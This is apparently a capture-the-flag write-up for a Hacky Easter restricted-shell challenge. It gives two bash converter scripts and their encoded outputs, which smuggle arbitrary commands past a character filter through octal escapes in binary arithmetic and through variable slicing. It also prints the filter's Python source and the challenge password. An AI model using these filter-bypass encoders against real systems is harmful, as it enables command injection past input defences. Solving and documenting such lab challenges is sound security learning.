# Crash Bash

## Description

Can you crash the bash?

The password is B4sh_br0TH3rs

Connect using nc ch.hackyeaster.com 2303

Note: The service is restarted every hour at x:00.

<img width="351" alt="image" src="https://user-images.githubusercontent.com/2973929/234140051-1756aaaf-0755-4869-9753-3242fb4f15db.png">

## Solution 1

The challenge presents a limited shell that filters almost everything you try, such as letters, dots, and some other characters. However, just a few weeks ago, a friend showed me a WAF bypass that works with bash, which I'll go trough quickly:

```
${0}<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
```

This is just a `ls` command.
Breaking it into parts:
- `${0}` in your terminal refers to the shell you're in, in this case, `bash`
- `<<<` indicates you're passing a [Here String](https://tldp.org/LDP/abs/html/x17837.html) to something.
- `$\'string\'` is an ANSI-C quoted string. In this form, backslashes can be used to escape characters.
- `$(( ... ))` are arithmetic expansions, which allow you to perform arithmetic operations in the shell.
- `1<<1` is a [Shift operation](https://www.interviewcake.com/concept/java/bit-shift) that results in `2`
- `2#10011010` is a base conversion operation executed by the arithmetic expansion. It converts the number in base 2 to its decimal equivalent.
- `10011010` is the decimal `154` represented in binary. When preceded with a `\`, most shells will take it as octal, which will be replaced by the character with the corresponding ASCII value `\154` = `108` = `l`
- `10100011` is the decimal `163` represented in binary. When preceded with a `\`, most shells will take it as octal, which will be replaced by the character with the corresponding ASCII value `\163` = `115` = `s`

So in steps this is what we've got:

`bash<<<$\'\\$((2#10011010))\\$((2#10100011))\'`

then:

`bash<<<$\'\\154\\163\'`

and finally:

`bash<<<$\'ls\'`

In essence, this bypass uses a very strict and small character set.

After spending some time trying to figure out how to add spaces to this bypass, I created this converter:

```bash
string=$*
string=$(echo -n "$string" | xxd -p | tr -d '\n')
echo "string: $string"
str='${0}<<<{$\'"'"
while read -n2 char; do
        (( ${#char} != 2 )) && continue
        [ "$char" == "20" ] && { str+="\\',$\\'"; continue; }
        octal=$(printf %o "0x$char")
        bin=$(echo "obase=2; $octal" | bc)
        str+="\\\\\$((\$((1<<1))#$bin))"

done <<< "$string"
str+='\'"',}"
echo $str
```

```
./convert.sh /printflag.sh B4sh_br0TH3rs
string: 2f7072696e74666c61672e736820423473685f6272305448337273
${0}<<<{$\'\\$(($((1<<1))#111001))\\$(($((1<<1))#10100000))\\$(($((1<<1))#10100010))\\$(($((1<<1))#10010111))\\$(($((1<<1))#10011100))\\$(($((1<<1))#10100100))\\$(($((1<<1))#10010010))\\$(($((1<<1))#10011010))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10010011))\\$(($((1<<1))#111000))\\$(($((1<<1))#10100011))\\$(($((1<<1))#10010110))\',$\'\\$(($((1<<1))#1100110))\\$(($((1<<1))#1000000))\\$(($((1<<1))#10100011))\\$(($((1<<1))#10010110))\\$(($((1<<1))#10001001))\\$(($((1<<1))#10001110))\\$(($((1<<1))#10100010))\\$(($((1<<1))#111100))\\$(($((1<<1))#1111100))\\$(($((1<<1))#1101110))\\$(($((1<<1))#111111))\\$(($((1<<1))#10100010))\\$(($((1<<1))#10100011))\',}
```

Just copy and paste it into the remote shell:

<img width="726" alt="image" src="https://user-images.githubusercontent.com/2973929/234142293-7f6fe5fd-d15c-402e-b088-2e1852c219fc.png">

## Solution 2

I mean... I was happy that I had solved the challenge, but in the following days, I couldn't help but think that my solution was overkill. Since I had found a way to execute any command I wanted, I was able to, for example, read the code for the limited shell:

```python
#!/bin/usr/env python3

import subprocess
import re
import os
import random
from inputimeout import inputimeout, TimeoutOccurred

NOT_ALLOWED = re.compile("[a-z*?.]")

def create_tmp_dir():
    random_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for x in range(32))
    dir_name = f'/tmp/{random_name}'
    os.mkdir(dir_name)
    return dir_name

def main(directory):
    print('Welcome to Crash Bash!')
    print('To get the flag, call /printflag.sh with the password!')
    print('Enter "q" to quit.')
    print('----------------------')
    do_run = True
    while do_run:
        try:
            inp = inputimeout(prompt='crashbash$ ', timeout=30)
            if 'q' == inp:
                print('Bye!')
                do_run = False
            elif NOT_ALLOWED.search(inp):
                print('Invalid input, bash crashed!')
            else:
                try:
                    subprocess.run(['/bin/bash', '-c', inp], stdin=subprocess.PIPE, timeout=20, cwd=directory)
                except subprocess.TimeoutExpired:
                    print("Timeout")
        except:
            print('Timeout, bye!')
            do_run = False

if __name__ == '__main__':
    main(create_tmp_dir())
```

So, I was convinced that there must be an "easier" way to solve this.

Upon inspecting env, I discovered a variable named REMOTE_HOST that contained the IP address connected to the box, which would give me the `.` character needed to run `/printflag.sh`.
That's when I came up with the following solution:

```bash
#!/bin/bash
comando="$*"
REMOTE_HOST=1.2.3.4 # mocking variable content inside the box
A=ABCDEFGHIJKLMNOPQRSTUVWXYZ B=$A${A,,}0123456789_/${REMOTE_HOST//[0-9]/}
echo -n 'A=ABCDEFGHIJKLMNOPQRSTUVWXYZ;B=$A${A,,}0123456789_/${REMOTE_HOST//[0-9]/};'

while read -n1 char; do
        (( ${#char} != 1 )) && { echo -n " "; continue; }
        for (( i=0; i<=${#B}; i++ )); do
                [ "${B:$i:1}" == "$char" ] && { echo -n "\${B:$i:1}"; break;}
                (( i == ${#B} )) && { echo "faltou $char"; exit; }
        done
done <<< "$comando"
```

```
./convert2.sh /printflag.sh B4sh_br0TH3rs
A=ABCDEFGHIJKLMNOPQRSTUVWXYZ;B=$A${A,,}0123456789_/${REMOTE_HOST//[0-9]/};${B:63:1}${B:41:1}${B:43:1}${B:34:1}${B:39:1}${B:45:1}${B:31:1}${B:37:1}${B:26:1}${B:32:1}${B:64:1}${B:44:1}${B:33:1} ${B:1:1}${B:56:1}${B:44:1}${B:33:1}${B:62:1}${B:27:1}${B:43:1}${B:52:1}${B:19:1}${B:7:1}${B:55:1}${B:43:1}${B:44:1}
```

<img width="722" alt="image" src="https://user-images.githubusercontent.com/2973929/234144048-423e3a2c-0ed6-4fdd-9a27-620927876c5b.png">

